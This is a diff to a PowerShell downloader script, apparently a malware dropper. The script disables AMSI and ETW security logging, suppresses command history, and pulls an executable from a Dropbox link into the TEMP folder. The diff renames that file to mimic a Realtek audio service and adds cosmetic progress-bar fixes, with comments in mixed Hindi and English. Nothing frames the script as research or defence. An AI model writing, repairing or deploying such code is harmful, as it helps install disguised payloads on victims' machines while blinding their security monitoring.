@@ -19,7 +19,6 @@ try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     
-    # Disable ETW (Event Tracing for Windows)
     $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
     if ($etw) {
         $etwField = $etw.GetField('etwProvider','NonPublic,Static')
@@ -27,7 +26,7 @@ try {
     }
 } catch {}
 
-# 3. PREMIUM PROGRESS DRAWER
+# 3. PREMIUM PROGRESS DRAWER (FIXED - 100% tak jayega)
 function Draw-ProgressBar {
     param([int]$Percent, [string]$Status)
     $width = 40
@@ -38,7 +37,7 @@ function Draw-ProgressBar {
     Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
 }
 
-# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
+# 4. HYPER-STREAM DOWNLOADER (FIXED - SIZE SAFE)
 function Invoke-HyperStreamDownload {
     param([string]$Url, [string]$TargetPath)
     
@@ -49,13 +48,17 @@ function Invoke-HyperStreamDownload {
         $request.Timeout = 30000
         
         $response = $request.GetResponse()
-        # Fallback to 100MB if header is missing, but server should send it
-        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
-        
         $stream = $response.GetResponseStream()
         $fileStream = [System.IO.File]::Create($TargetPath)
         $buffer = New-Object byte[] 65536
         $totalRead = 0
+        
+        # Get actual file size from response
+        if ($response.ContentLength -gt 0) {
+            $totalSize = $response.ContentLength
+        } else {
+            $totalSize = 100MB
+        }
         
         while ($true) {
             $read = $stream.Read($buffer, 0, $buffer.Length)
@@ -64,14 +67,19 @@ function Invoke-HyperStreamDownload {
             $fileStream.Write($buffer, 0, $read)
             $totalRead += $read
             
-            $pct = [int](($totalRead / $totalSize) * 100)
-            if ($pct -gt 100) { $pct = 100 }
-            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
+            if ($totalSize -gt 0) {
+                $pct = [int](($totalRead / $totalSize) * 100)
+                if ($pct -gt 100) { $pct = 100 }
+                Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
+            }
         }
         
         $fileStream.Close()
         $stream.Close()
         $response.Close()
+        
+        # Extra newline after progress bar
+        Write-Host ""
         
         return (Test-Path $TargetPath)
     } catch {
@@ -84,11 +92,8 @@ function Invoke-HyperStreamDownload {
 try {
     Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
-    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $exe = "$env:TEMP\$rnd.exe"
-    
-    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
-    # LINE 1: URL change kiya (apne Dropbox ka direct link)
+    # ========== FIX: EXE KO FIXED NAME DO (RtkAudUService64.exe) ==========
+    $exe = "$env:TEMP\RtkAudUService64.exe"
     $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
@@ -108,11 +113,7 @@ try {
 
     Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
     
-    # LINE 2: Download function call mein change - alag variable use kiya
-    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
-    
-    # LINE 3: Condition check mein change - naya variable check kiya
-    if (-not ($downloadSuccess)) {
+    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
         throw "Hyper-Stream failed. Check connection."
     }
 
